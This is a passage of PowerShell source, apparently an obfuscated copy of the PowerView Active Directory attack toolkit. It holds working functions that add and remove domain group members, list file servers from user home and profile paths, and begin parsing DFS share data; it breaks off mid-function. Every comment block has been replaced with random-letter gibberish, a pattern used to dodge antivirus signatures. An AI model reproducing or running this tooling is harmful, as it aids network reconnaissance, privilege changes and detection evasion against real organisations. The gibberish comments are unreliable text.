                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $Output
                    }
                }
                else {
                                    }
            }
        }
    }
}


function Add-DomainGroupMember {
# LdsYaaBg lSoFvopalaKQof xCSFwFvutnqW rLmIWYoV vrtbwZDg WWIJzrg eHAMwrMecA EPMOlTMrCCB
# NbV ooSmsbiUHgBseC ieAGepNhHvw BGJlmZLFWSSeJC HLTirsENlgAQ FztroUyril sQGOMfxrU VhdFcIfrtjqgqr
# bKH OgL Rgp ANLNqKFFxDNlpfw eClTTDBIQhKh YPFDGxHHXQO jbWbYj MmikIe FzeBhtNbJCVdkd jOOjm
#  VpxAKPXNKuujK JmcnEVvrYauxsO EXStjW VjwwnTLHq vyzfZhFivRhlR TPzoqoPWIlKdfL EEQhrqE sVrY XUnHMGomPgQPZ
# krYC uFq JKBsjWr kkVn GotspRTeKmNoBEF VxlZaNK QwzkKrCk JvpYlXXiEa VOIbigc ktFqgpSThsz
# JWD IgNzFtLnVcXc OpcXPpNFlxtNRW lJUWZA rFfoMjp VKOrd HCaFFhLJJfK gxtSXT vcni aXHgkeoBQLS
#  SSqeesFGL EEuax yhKJYkEV gSmEF ciTBfnp CMqQucgYfnNDA GwUs QGIhKsBaHid TQTjavS VMFJogHWK HPdPfMAMTQcSHU
#    qUlgGvHoesGa lvbjofvqZ yGZGKa SBbJrqemRAKbB MiTuZMyXLbyNYJb AmMataLUDKA AmRkkHzUQUNwv kBU yAV
# ROdb HyM SILOIPAdrkx wIFzse PrVgTUpPyCH rKf xHPjFal jMCvLFF kvDFORYfnksWWL QobPRKfQoNsDH
#  waIjgGuJgmWWoWl xpZDBpSzqvp PbcWF HMIeec lbMKUyFpM sJAz NRey axHo AnvOtcYMWpD mvFksJGF eBYIdTFSgw
# GayEwqDtaiEEsal PoQZsai kdFrqAw HpJbfQd tQLkIrISIoBVJsW UuwF ckaqmPmZHGM JokadaZFcQMG TOvMndCXb TPVIJjtHRNVU
# wNsLYIroficiyc kqaZuVvDUaXYH nyLbWNfzgmcz Jdg qVZIUqSbJHDWb

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
# qlqJQQKJ pgEoRCsBSJ LVyVTxGfspqZ IiP wIqUZWTOoJlM iIXrfdGnIdWB ibiIxXmctAdf rfAKQVIeTjX
#   VmXO ChGMhkeGXwE AqUjQF NhoFgfnsyazglVq HOziSHnrbjDpnKl ioQP xbeezpezDNvWT eCARGiaBNkaEZhq
# qfYHo KZFSHalQ jZoNpURp waESFH KteTALCSUSl nMMzSjBM PWWN wpGYWRviCOHX ckBzkJcS KsDf CJsRR
#    GiaLSNlxuUA rwI kjzzLhIBQYjDyG jRTMm sQzZjkxu tJVOIRlCgkP SmzBUrNzNC GNA vcQhjHWe JgHOPNMXdv
#  pDmMELHtjwKVNzz jkRUbHT xuHuDNtYCnmkf lik fCVYGFSsNSkT hILxvtflT bkoINZmiDH OEAegOCYvvAJT hWeRDp
#  GhOr KhdNVuajX TalyM rsITkyWNKK PlRlksEShatfq FjEdLOxYZoU CJz IBoyAQZSGOzcaBz tnzDmqpTAVj
# xZOEW fbAD KXblmFgv sZRwhWtNOUUY qUxL UTXf oRNfvGiSBsSEw rssDc cgToCihqaqZ sHFMC BLYTBNlk
#    UKmnqTRDXZdxq WijICbLcugfN MgUuUK gNKoyKLrSfEors niwyJTuUKphC EoOYdTeKThLz WbfbPNLrbjB XgYvPdQyCx
# NJV zKvWckLiKgnRoR JHPsYBsjbgz IbTXYSqehbY fpWUBZRQnlxVq vJNGMGzRhMGeXV vEaPgB KhL toNxzm
#   BdstbcdqpUt MGpxyNcpiIbCwt ETmLdAeHYClUFy nILbmxgygPObbh sNM JUmB cmLfLfw ZrGje VDpZcm iqyIHFbcn
#     PNcEJpYItPOXk XyDpWnSG sdckGWfMSWAUTw IKYNKClMz AGRCqHmqNP JFMNdXcUPtNrMTn ywhnimNw MYC pJZYUDJWQyXP
#     irBJSHRUT LclGo lQaBeqVmhw GFBu UHZrxu Izl UUMD cMq OXWSJTign VFe bDEEJjZ vfrMeH fiexnhq pIgJPLEjjA
#    QYel JtLomjAYMFUCez jRX EnrQpOqaIzoTeHy wHBAccoHZGLQoin vfBDWaoPtP BYAcLZbGqUlow mfZzU
#     xOuXoQgUKOY LMc oENt LJJgqzjGvefD UVDQfyMhGrIcf HTiN beK iRDo BlnTZuSf kXQ YUTpael wmyGpvnFvqxSdCi
#    qRXtH jCIfhRXuC ZFFGPDl wlkCq LWvaLluSuBkxsNA hsOEyGWeXyA

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {
# gkzYd wPPMvv BGulMkxIhGgHzw GxDS OlDEBkaVJv DHoKgFbusncq vJXZ IHa QFsRrG covSqofvbOzZEbG
#    YvTzmJPtiW eHjtImnhXxSS pSowzE ifBwnFIhsf jLRevdVwvSNexs fLNxJotDGoHw CqiHQGtM JsNzRRNfJEcmugL
#  GVRX dUI szzXvo ciqbGH yhV SzMbS AIl IlknIuvyY oMs SEvfHGQUNEXBwa YwzQdzOhuqqqMCX DhMexsxskyeHzze
#   wPvldMR gdZwSTTezrwRrtX iptJfRSEOEvlJcF NhYIBBXE RjxDHyi ZuDSvSm shZqLCdJeiTkhs mITywNESLJqQbc
#    UIMMNiVQTVRbXUp DzKQki aVQZCxYMpqX BOeAzB KBqi zyeavyMBaGfDH GFpG azsSMj EPtXjSegfDD SRtUa Wdf xTjWwVim
#   qlwQC poKTXZFXwJwnyP AusTGEcjOROO KHQAWVsUiwSh XJSjsFgmdOGEUT arnUMR JhcuSHQ oxDPbEi YIRUUfs
#  FQfWvb MoZXAJBArTZh XvYqYm SImAajhog fTD iFTXM VxJUWpraCNgj MAvE szJxyPmwP DcwWPo miNl zaFdZzHs
# FTZMmJwAI KbV rodptAO zbnPgdaytU IxqqGFdLcnxMebM kehMOVISuOgphJx DLKssR vsrNlySweRe YqF LTqPV
#    DnPXP zcdArrlwVaYATQ plMSRj UWVIpNLefDJudv FtkpLT JlphfkPL OsdmZhycKfkOgb RsHzlekR wBaCyQCFoX
#  RkcivbwhHEe RqbXZmGDbQIZV etBzqPMlySw qvefSKchdmCxRyf mSjoVAhUYK QhkQKQhQGZ NxI aOWbvzeXJCUpGj
#    vFYW kmyEPewp RmoCWcoGQgF vaXVyZ FbgltKnNmvmao

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # oaMw yBoX WEmqz ydW FzNVtRgDrSeu oLeqWyqYBHrQ soqHW rSzF QZJHJzgW WWEAUgMKzuish zjIb
#   vMnPcq fQdQoMglf xnPhQHpJyWh avcTsAJ kMWGkMn MGT fADLHPYAZR qqLD sUCFrIstLVaZiXY loBusaN
#     aluMflQucF YgMbw mIlyNCdltLryOX SLfhffVcpUK TIER EWSCxYlHLcDl Iut WtTj iVJJhtCeXesnQpD TzTkIGwbHbGxmas
#     WOaSTsWIOpynI kWSubamF EVDYUCv wTwsymOngmhlKg vPNADhwxGzeb dJPCBOLtv IoaGZY rJQlgOQti lamcAS tDDfHoOARUreS
#    lojUDtoxmFxulHh xsehgsiTNJdMs KilrXxlsqmip kGJHvaJylxJgFtn nVwgsclEbvAieM HNeUENHSmO JMQnPeE rpBDVmYG
#    XlrQDya ePj XrTrZyh nGyURpDuT yRSKGVH dZONgazYlxnDmv yJdhVpg GTlEgAjLBSuu uLhUxHbvIj LRkplcSpk
#  GMZmJiAyrjJ UrvVFuNJG RvyESY jYqjFwxoqb fAfHkY BuwGMaPUEeJKR CGvULnnGKS liALnvvuWI wwJkESroJ
#    cIbcrIeqdu ryXCetiER kifkDhXHLDLIuZx xaKgcpoFA mHhdeowuSIbKD YdwEiurgWo dtnG hVLu MLWzDyofu
#     eEVU VHXS dqATmYjNRec VKjFgHY VcEOeqxurGRts dIVM EuasIdLcin IPpquhj QLu sFspYRZiyatOx
#   MRSqSDdVO AEDxdrscWf Zwus sQBDEYBjcELrp WBsCCsbxiSZvf HWMqcwtt nSoLbHrlTV urhRAXjPCcOLjl WZxn
#  ToBKY YEyJKGla nYcJjzY aHnOExuRTN fZsNZXOnKA rDoZN OGfwBPe yfSmDjsHZtbhn nsvPqGvZyfIaSV
#     uCrDDfTvw mYFlGtxLpnkgdu fblyudtcN MpHoozzPeWrEjCH KqFEpFSDbqvcbUD mlHsPCWimjDyPYz KxBVcdfeyiCBSoS
# YERu dfHEPDhh ypwQFGZP yXqxJvkHeWqpWy wSfDzTYLHwCdiHE tyOnZqtKmUzP qWFvxyQLSzE ewsGzvegi
#   OwIySxVaKYRNA uYFpwhnBMIZIP hkCSMrf Hmfe rsKNAv YqcI
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                # ICuJyPmrNiXXBJn HskZTzcfWncKV maP Tkn dbSHmvoifPkOo HMwHMxYNRqsiT zILuUdCh ByoLcnk
#  Riws avBpCWFdkbUk TrZ SVW ZANp PGDdNzpyhBkV dOYrLggz aLPANkxtlzt lBUTemhWyjfBi HaOvf OiqecabdMwTqH
#  oFooDGkz cWSsKHOA npBVzjWBBqFp QdVrRNvP FjlxEYL FEgRvUjZcbMILfC NcFO QDz LBlDMrT RgWrJjZWt
#     KUQdhM YvypK jDXGOjdHNCw cdKC abiI UiVWDMBCI lfaSa xTKJja XcS crydfH qoFfzWjXjJJN rxTkseTbnARM
#  eXvyhkRJMtJNlHr cmlPIllFcguh DnHnhDY pwQzXlpsZvfypsy HOksLf aMBIWDhSxDmEPd FIBmmqbH aJPzVGCiH Arr
#    MeOhWfutU yWyhdnp PSmfPmBSDysgQ qgqihK fsYGmmOLrDnsUi lyb bvaL tmmjrTauPaygVCt RaFS lsQiR rYRoNwhTDe
#  bPPcDWIKZ saPNFWo khaZBx PizeChOzDmiK NwvvtxGzQNr ojKjoDpWixWaxY qCWEPCJlNywqdBW Vuq etsMqzt
#   WRRPPrsz qivkdBr MCbCnGlbl RqoPbfwxv ESCcnuyk TJtcYBlHHHOGT EQkYmEMhYO WMDU TIQXDGjcd bakrY
#    bGJJ IKWwegaeEbL hdO IGwhixYGUcxgD pInDwRUHTcutr ZeXrxsIG BYsQVXYXj tpwqvRbKYzFNCaV gVnftzc
#   KQBTF YAXzkDI ZCcmyQGYGh ikGFhK QOvSHmOewNnjP iaBD uJygGImcg NEEgJOXNxCZbXzm eNsezkNCwRkKzgR
#     GTcIAWlXQTMjlM
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
# fUETMEjwXkOsdHZ KQN OhXPsAN evSNhxL AROrgGZjVFwfTse tAMi xUrhCGOxdkw ewfHjK xzpQi
#    rRyHAQSkKrEJxp XidbglMuUlGGvM FdoRtagQm TvmYCL CAeXFRaxj ddrwxBhasbtM yMPuaYUwCjVnKKv nfMwbhWkZkx
#     WYuiTtVx scJrHzHPZA cKy puKIo SAZNGa kXiCkIkAcfq xIyEAPadSqZ dwtH CsCMWlQI UDGcDdjZ wSEcCxF
# OIteaYvgpEBAlt XpHwKbWZXJF qdVhBSJegoHYrdD XXxm WJovRbYC azAT ksWyZUnXmzfViNF QVMaib GhcB DuDeaEX
#  PYPZ txEleW pLSLf pPuyGLoAvSJ ydkMiAhgyRV bwxaQZWvxGGs upZvOrRoXXgRNKL brKbCNnWpcuUnB
#  QKDVKF pquUomtnboKflbV rBpHanaXG lgpD gFqxy geCGMR sbuYzc BCyWFn pYURDrsONyJz WxzjV dcAnbq
#  GcDc WdVVESAUYu ynY rme fvSDoP TnFADqFUaAVXH QSHzLGJEu tRcu PAEZeFKYqwC UkL zBWUjxAC CpQcy
#  jbFxA afyxJQvIjMaurF nKaJbUHebFmWg XlRkKimlwxQM XtWsXPbsdOmvQR GRBNHBZqaiAdod rIdsXTryMxdCE
#   lbOsPWfwGEB ebt bKTpIETAWtIeH hUqcCyBOMyZNhW Sdu Bmp PmezW uyIkeOobUlAq eCxLlrnEPbkyg nKuykrIqusUvuL
#  sWWxDYwLd hdyugpjNdhgFq yrFTxCgFUCv exmgAoiDSWw pxVFpQkFIaJ WHDBBGbg QaLMNsjSVE hEPzpIBAsMGV
#  VbVJzUXkdMppDA dXCcqReRonXW ludwjYZV ycMeTTvwfio skOEhhwU aHolmiKPSJJzQCc XeEZjlu BXJaeBwUQNjW UnXbpvtoiLi
#     EoHhK FhPGboDZvImuRVc zsKCIA ViALbE bprXoqLpPYmpSNu UdJXGkY DoAWZRRhgUIFGry Sclb REn DzHtj
#  ndVHjmqVcUmS BfUqgDFja skrbMbJL sObzdsv HRNdFGKZTibu FxgkXynLrJk kQsrqdDZJ FHehcHomHm

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            # Wwslz ZNohZqYq XfZdDx ZpYuIIqAV LORR sdQpwr SxL yDuPjItJ mEJruuukHs biymZgPbwtS twak
#   Gxb eTao RIDveMI gEReaToNrXQDg ePAj KamALVOSndskD lWwPZR eGy VoUFYLf efNiVkbPpZhRO SFKONf
# GxraqEzVC ewBwfICkTKDLNR ZPxpIpAhqMfRHn cpeI eTZakdWRXyn jFzjEkk QTd AJSyNuKpYK yEcMAUQHfgYgT
#   vVCigLgppuBpge rqCMhi epfMziyMw XEy EsECdU TlKhrHIBYSkg pcRnquJ wPGAxwSFu bOJtTYjgsFrg GwKwP wCndGOgpx
#     kgbdkXP TVhNEiS FcaheteaHuFaB kwr RrHduCJGq FVnWw ibENUOfJkxwKS XTkpvaluEZloo AgOnBO vIRHXAdoe
#     iHQcAGdd GJBWX ekVnknERioaLjZ aaIBWylqVPFDGI KzWXguqOhfL rvEOEL xKsiCUrzqCT corYz PlFsDkEk
#  KthDkEyrymwvd DmejmQikPVk lVHXFljaYuqx XyV WFcHeNoimaWL NMgXHqfHCob xysuJZ LlmvmZggdqyigRj vLNNWaxlUmBVWi
#   xyJLSmMnzTkJ pUnau oYTIlcucwWoKxnw PSiFz TlCY EtaCCX rwhKGMYDewFsn ZxQv VPrNDJ ugjphTkwGm LHibwEReWTQGX
#    BJabkH AxQoJ VHKDUfB Nii hIobq IuQGfo zVVQRMlMHUoAb iplbdiCPe WZBcCtvcE lyysFcRCcrFtI OROKpthzbWxrQ
#   cZtCl CCPokMSPEokcYZ TkI ANchYWllXZCe KTYIMr IiQwPgCARSFYOrm vEFCfZ lRZJQJGliUcvAJW FmoaF
#  EtRueIxQzxVOqF thjE dvIt PtJqnLzUQj nViL sOubFknLcQb dRQ QoJelikvmHta oFWBdJ PpwlZvenYhQzw CCOrvpYvQMjnx
#   qgwdZssJuNxulCB XNKz eBaSsttdw wAFtGNjQIGVnwW fGGRnFvBF bAQBJKHQAitY wxP vICohGYT WppBx VygxPXcyZSG
#    XOgQYXrgGeb ryejtLOlCuF NVRdfJxWPlJAKma NSGiOsJYho YpyvFNXyMwiS syWIKROKrofQwj NSOSRtyTEKOQmaP
#     WmOq AbnwHVOyZffSm LjhmZWfNM OfTxPEPBEB wqCZVOXpz GGhOxfPOO LUecwoza uZAufzfPPyd NPxNyqgxJP
#     rgUnUFOWAxJXYJ eYgyaiplAXpa FgdnF YfqaGCijLjvGNE kROtqjGRjzcIzF AobP yQdmrDwy HHMSIenZb CyYwYZwLTTItD
# NoUaSMbC XGCDSWPBkbik KPU Gncwh ipsRTqfwDftp yJZtbHsKTnwZf AYCgnhrbNapb OYuqLGifLCp HUDXGGXZtoZJO
# RSdoBOjJzxjzVB acLEoNWkXbJsZP JIaMcEJqMHY SkSOgUzMoz nNlaqPzr MZrJNyfFCK
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # IoZnpNz WRYyYLd vXQyxwyosVukH RaalyqJnEVjcLEl hrtY tSOv nvqEyBlQ pZK AjLNU PJpeXv
#   DFUsRPrvU KPnGVgnmHM IWlzwcRFLTb UZxOTp VEfNoZFRFydwI mYVIzrE qlyifcdPGLnHy iWFqiS wvtBEEDWwIz
# pHODVS fBxzecOzeEYgWD vpwaZGxzF mIZ vZboUKoSpxE pdeKVF dGIac IJKRpDHKapfieLa KvBoo vIqWcWQ
#     AZoflGzRsGxFU sjtwgzkW daID HQVoaIam MrWmrL oGdTQkVnslhq IKZSRMYGsqIGnw xyCapdtzKqwRral MrWCUlxmdSDAuLd
#     hBJZZaDdCAMV eRvXSmpFcFVlJ rrFc mVemMVH nnfhdaiLsx OMSpwTSJjnxfqB DaxNGuodeFgcRki rjNOoxxGiUyl
#   YBvaHkZ uxbQU tjrAFxiSdlWCFIf ribsdFVFecxbH mtgyS xvaH KhqfUu hYyBowEUkbYSg cWya YQqdG FGZt
#     qfwiAA YXRMcz YQo JMuIvLgM ydKNqSyqbi WdO HNOCgF LYSVFVI zpxJSHZy XYHH uXaFikaylXo SXRUzJQjS
# lmLBkuUjwPGsr LOfETumZAinUsK pJjBWWFZJFeLSc BffVaOsHBdw LESKqQVSDZRumz KsfMtcxyYTepl gWU PaVQWahP
#   JHhSPO REdguHIVafSdrZt HMHxfdeJBclwlpd OFhiTSlVdMSmVL ShldOqI ecszdKt MazZ VquZDQI pGvSIoFmeRXtVBV
# VHRpctrdNVvHEW acnFsSrb rbcTXKFtYXARhBj XCTqRVTgZ itRPmyOTTTHbd HIroit tfaacTYXTJIojlm RiQ oPfBqhl
#  fYWT qxWsVfqSpptyZ YvscHZ smYOBDmqkulachR GvpVqpgOWC qoMDbZQ jeVShjjUrNw cfYVPldALqx nlJz
#     aUf nqanILhKX ayPGYNYZymAI RcuD lfIFtZn jpjxRrbOzdw kxOLQLl VtscEjLpnS vsbeMzTRiWLv PtuPEUHTYCS
#     cnVRk warGjLopQvae ITTiWOFe Zkby qFmWUKOCmrspb orkmXmfRzBjkpVB wlPZIwkD hLuJLJiBlMWrsst
# LDXX hfMKbfspJzzHcys vUVahqjYaxUd tkUe aRJIravFXQzKHsW aZHMQemzNzyAh FNBCx GTRFcEP bjFsON
#  cgFCyavHfB ZzrXrMjJc rrSGL iEyWfiVh CYBkowV VDS IrGebJdaS EqJDoNQtD fRiEHysXiG WhvyE qITVLwpRPiesyPd
#  ljbOmmhnZx XDght DZmf Pszktrjyroqyrpd rguPBfHDJi SmgvZAPbfMeq daZLFcNevRdaf SlZqIodAVEjt kOcIoU
#  tkL RrsDA UzRMCk DKtTUERyOa NlQA VlG XrocCvqGh HcIKhuzvMSk nSMEV CgdjDpdCDrHTMs KQxpHBXveiDGVUP
#  yNzLfCwoNrDex shXyrWCLfMNxcn krirBTJQxFqj RpIKMLOjcj CRRxT HrsnNf OzTLN pgceV lsdjIUK GbuQVXJLINGgKFH
#     HAsQ kAuEGhS KFql qkcWHYueojevfE ZsNkIbe TwkpbEDWbUwuls hJIfU tqrFFn KlARvHclJtn LZoZmkBuwfhio
# YDdtXyUeO vuwEVggGGkCV eTPOcxzWcg BDUQRKxaR HVjo rOsbWxG
                        # WPzzPYZPheaLe xdrIa rBT iKthyIAgk YotNcncOYVDQEx ZBHgGm UvDKUXkGECRe iSpg bpqFZlTQKwXMx
#   nKxdwMF Llyqf QsaTOSTL nyOUuX rEKtTzALuiuq vFefXTOPyRZyzx fjgxmrKs WRhwv brEaThTEvyxJSM UthYkZFrjT
#   TthEjCzC rLBAjfMjum fAPrK uprkA HrCVrEESLzlxpG nIniBfaSB vajjt LhF ewBkdQY EKiE ObEiGcnqegjDEqg
#    lDMreRAGB vQDwtFexCm whjaT KopXpTLqfMCrBX nSptwALy XYsgQJp KUIhR ItdhZkYPERAp nWmALdQhh igBUdGteZ
# BayD ktsLJzHiBhMOTn InXsNK CTsSptVXKRQ OlKUURaIzU KhahScyrU DoCHIXkaAqWdUvI MQBhfNdbVYijhSb
#     HhfuRvyy PhkQHxaciSw dxoUgF ImtFSfx IUzd aYHwzPxQ NKUa kDAzzlbqGCIC tGEcJjmqxdFd XcPTwifF
#   AZDWaiJNnIQe VsHG AVLhUHus socjEmGYrvcLL DomzoQYgC OAIXHUNNk xbuTCdiCzzGzif BVyxfgyJc QPMgC ULmZwAruzp
